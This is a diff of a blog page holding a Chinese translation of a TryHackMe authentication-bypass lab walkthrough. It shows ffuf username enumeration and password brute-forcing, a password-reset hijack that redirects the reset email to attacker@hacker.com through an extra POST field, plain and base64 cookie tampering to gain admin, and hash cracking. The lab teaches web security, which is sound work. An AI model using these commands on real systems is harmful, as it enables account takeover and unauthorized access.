@@ -27,7 +27,7 @@
 <meta property="og:image" content="https://mirror4s.github.io/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-IntroductionToWebHacking-03/f457baf00c357990014739bd6bce5b75.png">
 <meta property="og:image" content="https://mirror4s.github.io/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-IntroductionToWebHacking-03/3d97e3e37bf9e4db4f95f4f945a7e290.png">
 <meta property="article:published_time" content="2023-02-06T09:05:30.000Z">
-<meta property="article:modified_time" content="2023-02-06T09:45:54.161Z">
+<meta property="article:modified_time" content="2023-02-06T11:54:19.459Z">
 <meta property="article:author" content="MirRoR4s">
 <meta property="article:tag" content="tryhackme">
 <meta name="twitter:card" content="summary_large_image">
@@ -239,7 +239,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          5.9k 字
+          6.3k 字
         
       </span>
     
@@ -250,7 +250,7 @@
         
         
         
-          50 分钟
+          53 分钟
         
       </span>
     
@@ -293,7 +293,7 @@
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2023年2月6日 下午
+                    本文最后更新于：2023年2月6日 晚上
                   
                 
               </p>
@@ -302,77 +302,85 @@
               <div class="markdown-body">
                 
                 <!--toc-->
+
 <h1 id="身份验证绕过"><a href="#身份验证绕过" class="headerlink" title="身份验证绕过"></a>身份验证绕过</h1><p>了解如何破解登录和其他身份验证机制以允许您访问未经许可的区域。</p>
 <h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>在这个房间里，我们将了解绕过、击败或破坏网站身份验证方法的不同方式。这些漏洞可能是最严重的漏洞之一，因为它通常会导致客户个人数据泄露。</p>
 <p>启动机器，然后继续执行下一个任务。</p>
 <p>回答以下问题</p>
 <p>我已经启动了机器。</p>
 <h3 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h3><p>尝试查找身份验证漏洞时需要完成的一项有用练习是创建有效用户名列表，我们稍后将在其他任务中使用该列表。</p>
-<p>网站错误消息是整理这些信息以构建我们的有效用户名列表的重要资源。如果我们转到 Acme IT 支持网站 ( <a target="_blank" rel="noopener" href="http://machine_ip/customers/signup">http://MACHINE_IP/customers/signup</a> ) 注册页面，我们有一个用于创建新用户帐户的表单。</p>
+<p>网站错误消息是整理这些信息以构建我们的有效用户名列表的重要资源。如果我们转到 Acme IT 支持网站 ( <a target="_blank" rel="noopener" href="http://machine_ip/customers/signup">http://MACHINE_IP&#x2F;customers&#x2F;signup</a> ) 注册页面，我们有一个用于创建新用户帐户的表单。</p>
 <p>如果您尝试输入用户名 <strong>admin</strong> 并在其他表单字段中填写虚假信息，您会看到错误 <strong>An account with this username already exists</strong>。我们可以使用此错误消息的存在，使用下面的 ffuf 工具生成已在系统上注册的有效用户名列表。ffuf 工具使用常用用户名列表来检查任何匹配项。</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">user@tryhackme$ ffuf -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>SecLists<span class="hljs-regexp">/Usernames/</span>Names<span class="hljs-regexp">/names.txt -X POST -d &quot;username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x&quot; -H &quot;Content-Type: application/</span>x-www-form-urlencoded<span class="hljs-string">&quot; -u http://10.10.153.230/customers/signup -mr &quot;</span>username already exists<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>
-<p>在上面的示例中，<code>-w</code> 参数选择文件在计算机上的位置，其中包含我们要检查的用户名列表是否存在。该<code>-X</code> 参数指定请求方法，默认情况下这将是 GET 请求，但在我们的示例中它是 POST 请求。<code>-d</code> 参数指定我们要发送的数据。在我们的示例中，我们有用户名、电子邮件、密码和 <strong>cpassword</strong> 字段。我们已将用户名的值设置为 <strong>FUZZ</strong>。在 ffuf 工具中，<strong>FUZZ</strong> 关键字表示我们的词表中的内容将被插入到请求中的位置。该<code>-H</code> 参数用于向请求添加其他标头。在这种情况下，我们将设置 <code>Content-Type</code> 为网络服务器知道我们正在发送表单数据。 <code>-u</code>参 数指定我们正在向其发出请求的 URL，最后，<code>-mr</code>参数是我们正在寻找的页面上的文本，以验证我们是否找到了有效的用户名。</p>
-<p>ffuf 工具和单词列表预装在 <strong>AttackBox</strong> 上，也可以通过从<a target="_blank" rel="noopener" href="https://github.com/ffuf/ffuf下载在本地安装。">https://github.com/ffuf/ffuf下载在本地安装。</a></p>
+
+<p>在上面的示例中，<code>-w</code> 参数选择文件在计算机上的位置，其中包含我们要检查的用户名列表是否存在。该<code>-X</code> 参数指定请求方法，默认情况下这将是 GET 请求，但在我们的示例中它是 POST 请求。<code>-d</code> 参数指定我们要发送的数据。在我们的示例中，我们有用户名、电子邮件、密码和 <strong>cpassword</strong> 字段。我们已将用户名的值设置为 <strong>FUZZ</strong>。在 ffuf 工具中，<strong>FUZZ</strong> 关键字表示我们的词表中的内容将被插入到请求中的位置。该<code>-H</code> 参数用于向请求添加其他标头。在这种情况下，我们将设置 <code>Content-Type</code> 为网络服务器知道我们正在发送表单数据。 <code>-u</code>参 数指定我们正在向其发出请求的 URL，最后，<code>-mr </code>参数是我们正在寻找的页面上的文本，以验证我们是否找到了有效的用户名。</p>
+<p>ffuf 工具和单词列表预装在 <strong>AttackBox</strong> 上，也可以通过从<a target="_blank" rel="noopener" href="https://github.com/ffuf/ffuf%E4%B8%8B%E8%BD%BD%E5%9C%A8%E6%9C%AC%E5%9C%B0%E5%AE%89%E8%A3%85%E3%80%82">https://github.com/ffuf/ffuf下载在本地安装。</a></p>
 <p>创建一个 名为 valid_usernames.txt 的文件并添加您使用 ffuf 找到的用户名；这些将 在任务 3中使用。</p>
 <p>请回答以下问题。</p>
 <p>回答以下问题</p>
-<p>以 si<em>*</em> 开头的用户名是什么？</p>
+<p>以 si*** 开头的用户名是什么？</p>
 <p>提交</p>
-<p>以 st<em>*</em> 开头的用户名是什么？</p>
+<p>以 st*** 开头的用户名是什么？</p>
 <p>提交</p>
-<p>ro<em>**</em> 开头的用户名是什么？</p>
-<h3 id="brute-force-蛮力"><a href="#Brute-Force-蛮力" class="headerlink" title="Brute Force 蛮力"></a>Brute Force 蛮力</h3><p>使用我们在上一个任务中生成的 valid_usernames.txt 文件，我们现在可以使用它来尝试对登录页面 ( <a target="_blank" rel="noopener" href="http://10.10.153.230/customers/login">http://MACHINE_IP/customers/login</a> ) 进行暴力攻击。</p>
+<p>ro**** 开头的用户名是什么？</p>
+<h3 id="brute-force-蛮力"><a href="#Brute-Force-蛮力" class="headerlink" title="Brute Force 蛮力"></a>Brute Force 蛮力</h3><p>使用我们在上一个任务中生成的 valid_usernames.txt 文件，我们现在可以使用它来尝试对登录页面 ( <a target="_blank" rel="noopener" href="http://10.10.153.230/customers/login">http://MACHINE_IP&#x2F;customers&#x2F;login</a> ) 进行暴力攻击。</p>
 <p><strong>注意：如果您通过直接从 ffuf 输出管道来创建 valid_usernames 文件，您可能难以完成此任务。清理数据，或只将名称复制到新文件中。</strong></p>
 <p>暴力攻击是一种自动化过程，它会针对单个用户名或用户名列表尝试使用常用密码列表。</p>
 <p>运行此命令时，请确保终端与 valid_usernames.txt 文件位于同一目录中。</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">user@tryhackme$ ffuf -w valid_usernames.txt:W1,<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>SecLists<span class="hljs-regexp">/Passwords/</span>Common-Credentials<span class="hljs-regexp">/10-million-password-list-top-100.txt:W2 -X POST -d &quot;username=W1&amp;password=W2&quot; -H &quot;Content-Type: application/</span>x-www-form-urlencoded<span class="hljs-string">&quot; -u http://10.10.153.230/customers/login -fc 200</span><br></code></pre></td></tr></table></figure>
+
 <p>这个 ffuf 命令与任务 2 中的前一个命令略有不同。之前我们使用<strong>FUZZ</strong>关键字来选择请求中将插入词表数据的位置，但是因为我们使用多个词表，我们必须指定我们的自己的 FUZZ 关键字。在这种情况下，我们选择<code>W1</code>了有效用户名<code>W2</code>列表和我们将尝试的密码列表。多个单词列表再次用<code>-w</code>参数指定，但用逗号分隔。对于正匹配，我们使用<code>-fc</code>参数来检查200 以外的HTTP状态代码。</p>
 <p>运行上面的命令将找到一个可以回答以下问题的有效用户名和密码组合。</p>
 <h3 id="logic-flaw-逻辑缺陷"><a href="#Logic-Flaw-逻辑缺陷" class="headerlink" title="Logic Flaw 逻辑缺陷"></a>Logic Flaw 逻辑缺陷</h3><p><strong>什么是逻辑缺陷？</strong></p>
 <p>有时身份验证过程包含逻辑缺陷。逻辑缺陷是指应用程序的典型逻辑路径被黑客绕过、规避或操纵。网站的任何区域都可能存在逻辑缺陷，但在这种情况下，我们将集中讨论与身份验证相关的示例</p>
-<p><img src="/images/tryhackme渗透测试-IntroductionToWebHacking-03/58e63d7810ac4b23051e1dd4a24ef792.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><strong>逻辑缺陷示例
-</strong></p>
-<p>下面的模拟代码示例检查客户端正在访问的路径的开头是否以 /admin 开头，如果是，则进一步检查客户端是否实际上是管理员。如果页面不以 /admin 开头，则页面将显示给客户端。</p>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-IntroductionToWebHacking-03/58e63d7810ac4b23051e1dd4a24ef792.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>**逻辑缺陷示例<br>**</p>
+<p>下面的模拟代码示例检查客户端正在访问的路径的开头是否以 &#x2F;admin 开头，如果是，则进一步检查客户端是否实际上是管理员。如果页面不以 &#x2F;admin 开头，则页面将显示给客户端。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>( url.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-number">0</span>,<span class="hljs-number">6</span>) === <span class="hljs-string">&#x27;/admin&#x27;</span>) &#123;<br>    <span class="hljs-comment"># Code to check user is an admin</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment"># View Page</span><br>&#125;<br></code></pre></td></tr></table></figure>
-<p>因为上面的 PHP 代码示例使用了三个等号 (===)，所以它正在寻找字符串的精确匹配，包括相同的字母大小写。该代码存在一个逻辑缺陷，因为未经身份验证的用户请求 <strong>/adMin</strong> 将不会检查他们的权限并向他们显示页面，从而完全绕过身份验证检查。</p>
+
+<p>因为上面的 PHP 代码示例使用了三个等号 (&#x3D;&#x3D;&#x3D;)，所以它正在寻找字符串的精确匹配，包括相同的字母大小写。该代码存在一个逻辑缺陷，因为未经身份验证的用户请求 <strong>&#x2F;adMin</strong> 将不会检查他们的权限并向他们显示页面，从而完全绕过身份验证检查。</p>
 <p><strong>逻辑缺陷实用</strong></p>
-<p>我们将检查 Acme IT 支持网站 ( <a target="_blank" rel="noopener" href="http://10.10.153.230/customers/reset">http://MACHINE_IP/customers/reset</a> )的<strong>重置密码功能。</strong>我们看到一个表格，要求提供与我们希望对其执行密码重置的帐户关联的电子邮件地址。如果输入了无效的电子邮件，您将收到错误消息“<strong>未从提供的电子邮件地址找到帐户</strong>”。</p>
-<p>出于演示目的，我们将使用已接受的电子邮件地址 robert@acmeitsupport.thm。然后我们会看到表单的下一阶段，它要求提供与此登录电子邮件地址相关联的用户名。如果我们输入 robert 作为用户名并按“检查用户名”按钮，您将看到一条确认消息，表明密码重置电子邮件将发送至 robert@acmeitsupport.thm。</p>
-<p><img src="/images/tryhackme渗透测试-IntroductionToWebHacking-03/f457baf00c357990014739bd6bce5b75.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>我们将检查 Acme IT 支持网站 ( <a target="_blank" rel="noopener" href="http://10.10.153.230/customers/reset">http://MACHINE_IP&#x2F;customers&#x2F;reset</a> )的<strong>重置密码功能。</strong>我们看到一个表格，要求提供与我们希望对其执行密码重置的帐户关联的电子邮件地址。如果输入了无效的电子邮件，您将收到错误消息“<strong>未从提供的电子邮件地址找到帐户</strong>”。</p>
+<p>出于演示目的，我们将使用已接受的电子邮件地址 <a href="mailto:&#x72;&#111;&#98;&#x65;&#x72;&#116;&#64;&#x61;&#x63;&#x6d;&#x65;&#x69;&#x74;&#115;&#x75;&#112;&#x70;&#111;&#114;&#x74;&#46;&#116;&#104;&#x6d;">&#x72;&#111;&#98;&#x65;&#x72;&#116;&#64;&#x61;&#x63;&#x6d;&#x65;&#x69;&#x74;&#115;&#x75;&#112;&#x70;&#111;&#114;&#x74;&#46;&#116;&#104;&#x6d;</a>。然后我们会看到表单的下一阶段，它要求提供与此登录电子邮件地址相关联的用户名。如果我们输入 robert 作为用户名并按“检查用户名”按钮，您将看到一条确认消息，表明密码重置电子邮件将发送至 <a href="mailto:&#x72;&#x6f;&#x62;&#101;&#x72;&#116;&#64;&#97;&#x63;&#x6d;&#x65;&#x69;&#x74;&#115;&#x75;&#112;&#112;&#111;&#114;&#116;&#x2e;&#116;&#x68;&#x6d;">&#x72;&#x6f;&#x62;&#101;&#x72;&#116;&#64;&#97;&#x63;&#x6d;&#x65;&#x69;&#x74;&#115;&#x75;&#112;&#112;&#111;&#114;&#116;&#x2e;&#116;&#x68;&#x6d;</a>。</p>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-IntroductionToWebHacking-03/f457baf00c357990014739bd6bce5b75.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>在此阶段，您可能想知道此应用程序中可能存在什么漏洞，因为您必须知道电子邮件和用户名，然后将密码链接发送到帐户所有者的电子邮件地址。</p>
 <p>本演练需要在 AttackBox 上运行以下两个 Curl 请求，可以使用上方的蓝色按钮打开。</p>
 <p>在重置电子邮件过程的第二步中，用户名在 POST 字段中提交给 Web 服务器，电子邮件地址在查询字符串请求中作为 GET 字段发送。</p>
 <p>让我们通过使用 curl 工具手动向网络服务器发出请求来说明这一点。</p>
 <figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">user<span class="hljs-variable">@tryhackme</span><span class="hljs-variable">$ </span>curl <span class="hljs-string">&#x27;http://10.10.153.230/customers/reset?email=robert%40acmeitsupport.thm&#x27;</span> -H <span class="hljs-string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> -d <span class="hljs-string">&#x27;username=robert&#x27;</span><br></code></pre></td></tr></table></figure>
+
 <p>我们使用该<code>-H</code>标志向请求添加额外的标头。在这个例子中，我们设置了<code>Content-Type</code>to <code>application/x-www-form-urlencoded</code>，它让网络服务器知道我们正在发送表单数据，以便它正确理解我们的请求。</p>
 <p>在应用程序中，使用查询字符串检索用户帐户，但稍后，在应用程序逻辑中，使用PHP变量<code>$_REQUEST</code>中找到的数据发送密码重置电子邮件。</p>
 <p>PHP 变量是一个数组，其中<code>$_REQUEST</code>包含从查询字符串和 POST 数据接收的数据。如果查询字符串和 POST 数据使用相同的键名，这个变量的应用逻辑更倾向于 POST 数据字段而不是查询字符串，所以如果我们在 POST 表单中添加另一个参数，我们可以控制在哪里重置密码电子邮件已送达。</p>
 <figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">user<span class="hljs-variable">@tryhackme</span><span class="hljs-variable">$ </span>curl <span class="hljs-string">&#x27;http://10.10.153.230/customers/reset?email=robert%40acmeitsupport.thm&#x27;</span> -H <span class="hljs-string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> -d <span class="hljs-string">&#x27;username=robert&amp;email=attacker@hacker.com&#x27;</span><br></code></pre></td></tr></table></figure>
-<p><img src="/images/tryhackme渗透测试-IntroductionToWebHacking-03/3d97e3e37bf9e4db4f95f4f945a7e290.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-IntroductionToWebHacking-03/3d97e3e37bf9e4db4f95f4f945a7e290.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>对于下一步，您需要在 Acme IT 支持客户部分创建一个帐户，这样做会为您提供一个唯一的电子邮件地址，可用于创建支持票证。电子邮件地址的格式为<code>&#123;username&#125;</code><strong>@customer.acmeitsupport.thm</strong></p>
 <p>现在重新运行<strong>Curl Request 2</strong>，但在电子邮件字段中使用您的@acmeitsupport.thm，您将在您的帐户上创建一个票证，其中包含一个链接，可以让您以 Robert 身份登录。使用 Robert 的帐户，您可以查看他们的支持票并显示一个标记。</p>
 <figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">user<span class="hljs-variable">@tryhackme</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>curl <span class="hljs-string">&#x27;http://10.10.153.230/customers/reset?email=robert@acmeitsupport.thm&#x27;</span> -H <span class="hljs-string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> -d <span class="hljs-string">&#x27;username=robert&amp;email=&#123;username&#125;@customer.acmeitsupport.thm&#x27;</span><br></code></pre></td></tr></table></figure>
+
 <h3 id="cookie-篡改"><a href="#Cookie-篡改" class="headerlink" title="Cookie 篡改"></a>Cookie 篡改</h3><p>在您的在线会话期间检查和编辑网络服务器设置的 cookie 可能会产生多种结果，例如未经身份验证的访问、访问其他用户的帐户或提升权限。如果您需要复习 cookie，请查看任务 6 的<a target="_blank" rel="noopener" href="https://tryhackme.com/room/httpindetail">HTTP In Detail</a>房间。</p>
 <p><strong>纯文本</strong></p>
 <p>有些cookies的内容可以是明文，做什么用的一目了然。例如，如果这些是成功登录后设置的 cookie：</p>
-<p><strong>设置 Cookie：logged_in=true；最大年龄=3600；Path=/</strong><br><strong><em>\</em>Set-Cookie: admin=false; 最大年龄=3600；路径=/**</strong></p>
+<p><strong>设置 Cookie：logged_in&#x3D;true；最大年龄&#x3D;3600；Path&#x3D;&#x2F;</strong><br><em><strong>*Set-Cookie: admin&#x3D;false; 最大年龄&#x3D;3600；路径&#x3D;&#x2F;*</strong></em></p>
 <p>我们看到一个 cookie (logged_in)，它似乎控制用户当前是否登录，另一个 (admin)，它控制访问者是否具有管理员权限。使用此逻辑，如果我们要更改 cookie 的内容并发出请求，我们将能够更改我们的权限。</p>
 <p>首先，我们将从请求目标页面开始：</p>
 <p>卷曲请求 1</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell-session">user@tryhackme$ curl http://10.10.153.230/cookie-test<br></code></pre></td></tr></table></figure>
+
 <p>我们可以看到我们返回了一条消息：<strong>未登录</strong></p>
 <p>现在我们将发送另一个请求，其中 logged_in cookie 设置为 true，admin cookie 设置为 false：</p>
 <p>卷曲请求 2</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell-session">user@tryhackme$ curl -H &quot;Cookie: logged_in=true; admin=false&quot; http://10.10.153.230/cookie-test<br></code></pre></td></tr></table></figure>
+
 <p>我们收到消息：<strong>以用户身份登录</strong></p>
 <p>最后，我们将发送最后一个请求，将 logged_in 和 admin cookie 都设置为 true：**</p>
 <p>卷曲请求 3</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell-session">user@tryhackme$ curl -H &quot;Cookie: logged_in=true; admin=true&quot; http://10.10.153.230/cookie-test<br></code></pre></td></tr></table></figure>
+
 <p>这将返回结果：<strong>以管理员</strong>身份登录以及可用于回答问题一的标志。</p>
 <p><strong>哈希</strong></p>
 <p>有时 cookie 值可能看起来像一长串随机字符；这些被称为散列，是原始文本的不可逆表示。以下是您可能遇到的一些示例：</p>
-<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -381,8 +389,7 @@
 <th><strong>输出</strong></th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>1</td>
 <td>MD5</td>
 <td>c4ca4238a0b923820dcc509a6f75849b</td>
@@ -402,15 +409,13 @@
 <td>sha-1</td>
 <td>356a192b7913b04c54574d18c28d46e6395428ab</td>
 </tr>
-</tbody>
-</table>
-</div>
-<p>从上表可以看出，同一输入字符串的哈希输出可能因使用的哈希方法不同而有很大差异。尽管哈希是不可逆的，但每次都会产生相同的输出，这对我们很有帮助，因为 <a target="_blank" rel="noopener" href="https://crackstation.net/等服务">https://crackstation.net/等服务</a> 保留了数十亿个哈希及其原始字符串的数据库。</p>
+</tbody></table>
+<p>从上表可以看出，同一输入字符串的哈希输出可能因使用的哈希方法不同而有很大差异。尽管哈希是不可逆的，但每次都会产生相同的输出，这对我们很有帮助，因为 <a target="_blank" rel="noopener" href="https://crackstation.net/%E7%AD%89%E6%9C%8D%E5%8A%A1">https://crackstation.net/等服务</a> 保留了数十亿个哈希及其原始字符串的数据库。</p>
 <p><strong>编码</strong></p>
 <p>编码类似于散列，因为它创建了看似随机的文本字符串，但实际上，编码是可逆的。所以它引出了一个问题，编码的意义是什么？编码使我们能够将二进制数据转换为人类可读的文本，这些文本可以通过仅支持纯文本 ASCII 字符的介质轻松安全地传输。</p>
-<p>常见的编码类型有将二进制数据转换为字符 AZ 和 2-7 的 base32 和使用字符 az、AZ、0-9、+、/ 和填充等号进行转换的 base64。</p>
+<p>常见的编码类型有将二进制数据转换为字符 AZ 和 2-7 的 base32 和使用字符 az、AZ、0-9、+、&#x2F; 和填充等号进行转换的 base64。</p>
 <p>下面以web服务器在登录时设置的数据为例：</p>
-<p>设置 Cookie：会话=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==；最大年龄=3600；路径=/</p>
+<p>设置 Cookie：会话&#x3D;eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ&#x3D;&#x3D;；最大年龄&#x3D;3600；路径&#x3D;&#x2F;</p>
 <p>这个 base64 解码的字符串的值为 <strong>{“id”:1,”admin”: false}</strong> 然后我们可以再次将其编码回 base64 编码，但将 admin 值设置为 true，这现在为我们提供了管理员访问权限。</p>
 <p>回答以下问题</p>
 <p>更改纯文本 cookie 值的标志是什么？</p>
@@ -418,7 +423,7 @@
 <p>md5 哈希 3b2a1053e3270077456a79192070aa78 的值是多少？</p>
 <p>提交</p>
 <p>暗示</p>
-<p>VEhNe0JBU0U2NF9FTkNPRE1OR30= 的 base64 解码值是多少？</p>
+<p>VEhNe0JBU0U2NF9FTkNPRE1OR30&#x3D; 的 base64 解码值是多少？</p>
 <p>提交</p>
 <p>暗示</p>
 <p>使用 base64 {“id”:1,”admin”:true} 对以下值进行编码</p>
